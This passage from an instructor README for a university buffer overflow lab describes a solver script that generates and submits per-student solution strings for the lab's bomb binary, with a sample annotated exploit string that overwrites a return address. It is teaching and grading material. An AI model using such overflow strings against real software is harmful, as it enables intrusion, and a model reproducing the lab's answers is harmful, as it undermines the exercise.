...
*****************************************
5. Generating Solutions to the Buffer Lab
*****************************************

The ./src/solve/ directory contains a master solver script, called
solve.pl, that instructors can use to generate (and test) the solution
for any team team and for any level. The script takes as arguments "-u
<userid>" and "-l {0|1|2|3|4}" to solve for given team and level. It
emits its solution in file {smoke,fizz,bang,boom,kaboom}-<team>.txt.

For example:

    unix> ./solve.pl -u bovik -l 1

generates the solution for level 1 (fizz) for user bovik in file
"fizz-bovik.txt". Calling ./solve.pl with the optional -s flag will
also submit the solution string to the grading service:

    unix> ./solve.pl -s -u bovik -l 2

This option is very helpful when you are checking out the grading
service and want to generate some test submissions. 

The solution strings generated by ./solve.pl are annotated with
descriptive comments that provide helpful information about the
structure of the exploit string. For example:

    unix> cat fizz-bovik.txt
    /* getbuf return address at address: 0x556836c4 */
    /* Local buffer starts at address:   0x55683698 */
    /* Padding required:                 44 bytes */
    
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    /* fizz() located at: 0x08048afa */
    fa 8a 04 08
    00 00 00 00
    /* cookie for user  bovik computed as: 0x1005b2b7 */
    b7 b2 05 10
    unix>

The solution strings generated by ./solve.pl are compatible with
hex2raw and can be used as is to solve the buffer bomb:

    unix> cat fizz-bovik.txt | ../hex2raw | ../bufbomb -u bovik
    Userid: bovik
    Cookie: 0x1005b2b7
